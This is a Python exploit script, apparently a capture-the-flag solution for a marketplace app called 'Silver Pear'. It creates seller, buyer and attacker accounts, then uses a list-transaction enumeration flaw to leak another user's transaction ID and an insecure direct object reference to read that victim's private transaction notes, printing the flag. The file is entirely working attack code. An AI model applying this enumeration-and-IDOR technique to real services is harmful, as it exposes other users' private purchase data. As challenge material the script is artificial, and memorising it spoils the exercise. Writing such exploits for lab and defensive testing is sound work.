from __future__ import annotations

import argparse
import pathlib
import sys

ROOT = pathlib.Path(__file__).resolve().parents[1]
CHECKER = ROOT / "checker"
if str(CHECKER) not in sys.path:
    sys.path.insert(0, str(CHECKER))

from common import create_and_purchase_flag_product, register_and_login


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit Silver Pear list_transaction enumeration + transaction IDOR")
    parser.add_argument("target", nargs="?", default="http://127.0.0.1:7777")
    parser.add_argument("--flag", default="FLAG{demo_list_transaction}")
    args = parser.parse_args()

    seller, seller_name, _ = register_and_login(args.target, prefix="v2_seller", role="seller")
    buyer, buyer_name, _ = register_and_login(args.target, prefix="v2_buyer", role="buyer")
    created = create_and_purchase_flag_product(seller, buyer, args.flag, price=900, title_prefix="V2")
    attacker, username, _ = register_and_login(args.target, prefix="idor", role="buyer")

    leak = attacker.get_list_transaction(created["list_id"])[1]["item"]
    public_id = leak["transaction_public_id"]
    transaction = attacker.get_transaction(public_id)[1]["transaction"]
    notes = transaction["items"][0]["notes"]

    print(f"username={username}")
    print(f"seller={seller_name}")
    print(f"victim_buyer={buyer_name}")
    print(f"list_transaction_id={created['list_id']}")
    print(f"transaction_public_id={public_id}")
    print(notes[created["note_slot"]])
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
